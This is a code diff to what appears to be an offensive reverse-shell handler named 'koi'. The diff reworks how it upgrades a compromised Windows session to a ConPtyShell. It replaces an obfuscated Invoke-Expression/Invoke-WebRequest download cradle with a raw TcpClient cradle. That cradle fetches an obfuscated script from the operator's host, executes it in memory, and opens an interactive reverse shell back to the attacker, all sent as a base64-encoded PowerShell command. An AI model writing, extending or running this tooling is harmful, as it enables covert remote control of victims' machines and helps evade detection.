@@ -8,8 +8,8 @@ from typing import Callable, Dict, Optional
 
 from koi.session import Session
 from koi.utils.cache import cache_path, fetch_or_cache
-from koi.utils.ps_obfuscate import obfuscate_conptyshell, obfuscate_call
-from koi.utils.tcp import spawn_http_server, get_local_ip
+from koi.utils.ps_obfuscate import obfuscate_conptyshell
+from koi.utils.tcp import get_local_ip, spawn_send_server
 from koi.utils.ui import Spinner, notify, bold, accent
 
 _CONPTYSHELL_URL = (
@@ -17,15 +17,25 @@ _CONPTYSHELL_URL = (
     "/master/Invoke-ConPtyShell.ps1"
 )
 
+# Timeouts and delays
+_TCP_SERVER_TIMEOUT = 60.0
+_CONPTY_WAIT_TIMEOUT = 30.0
+_CONPTY_INIT_SLEEP = 0.3
+_CONPTY_POLL_SLEEP = 0.1
+
 
 def _build_invoke_cmd(
-    local_ip: str, http_port: int, port: int, rows: int, cols: int, conpty_fn: str
+    local_ip: str, tcp_port: int, callback_port: int, rows: int, cols: int, conpty_fn: str
 ) -> str:
-    iex = obfuscate_call("Invoke-Expression")
-    iwr = obfuscate_call("Invoke-WebRequest")
+    """Build ConPtyShell invoke command that fetches script via TCP (no HTTP)."""
     inner = (
-        f"{iex}({iwr} 'http://{local_ip}:{http_port}/c.ps1' -UseBasicParsing);"
-        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {port}"
+        f"$_c=New-Object Net.Sockets.TcpClient('{local_ip}',{tcp_port});"
+        f"$_s=$_c.GetStream();"
+        f"$_r=New-Object IO.StreamReader($_s);"
+        f"$_script=$_r.ReadToEnd();"
+        f"$_c.Close();"
+        f". ([scriptblock]::Create($_script));"
+        f"{conpty_fn} -RemoteIp {local_ip} -RemotePort {callback_port}"
         f" -Rows {rows} -Cols {cols} -CommandLine powershell"
     )
     encoded = base64.b64encode(inner.encode("utf-16-le")).decode()
@@ -67,10 +77,11 @@ def upgrade_windows_conptyshell(
         notify('info', "ConPtyShell fetched from remote")
 
     ps1_data, conpty_fn = obfuscate_conptyshell(ps1_data)
-    http_port, _ = spawn_http_server(ps1_data, timeout=60.0)
-    notify('info', f"Serving ConPtyShell on port {bold(http_port)}")
 
-    invoke_cmd = _build_invoke_cmd(local_ip, http_port, port, rows, cols, conpty_fn)
+    tcp_port, thread, errors = spawn_send_server(ps1_data, timeout=_TCP_SERVER_TIMEOUT)
+    notify('info', f"Serving ConPtyShell on TCP port {bold(tcp_port)}")
+
+    invoke_cmd = _build_invoke_cmd(local_ip, tcp_port, port, rows, cols, conpty_fn)
 
     notify('info',
         f"Invoking ConPtyShell on session {accent(f'#{sess.id}')}, callback {bold(mask_ip(local_ip, 'local'))}:{bold(port)}"
@@ -87,7 +98,7 @@ def upgrade_windows_conptyshell(
             conpty_staging=conpty_staging,
             conpty_lock=conpty_lock,
             expected_ip=sess.addr[0],
-            timeout=30.0,
+            timeout=_CONPTY_WAIT_TIMEOUT,
         )
 
     if new_sess is None:
@@ -105,7 +116,7 @@ def upgrade_windows_conptyshell(
     if logger:
         logger.log_event("upgrade_done")
         new_sess.attach_logger(logger)
-    time.sleep(0.3)
+    time.sleep(_CONPTY_INIT_SLEEP)
     new_sess.conn.sendall(b"\r\n")
     notify('success', f"Session {accent(f'#{old_id}')} upgraded to ConPtyShell.")
 
@@ -118,7 +129,7 @@ def _wait_for_new_session(
 ) -> Optional[Session]:
     deadline = time.monotonic() + timeout
     while time.monotonic() < deadline:
-        time.sleep(0.1)
+        time.sleep(_CONPTY_POLL_SLEEP)
         with conpty_lock:
             if expected_ip in conpty_staging:
                 return conpty_staging.pop(expected_ip)
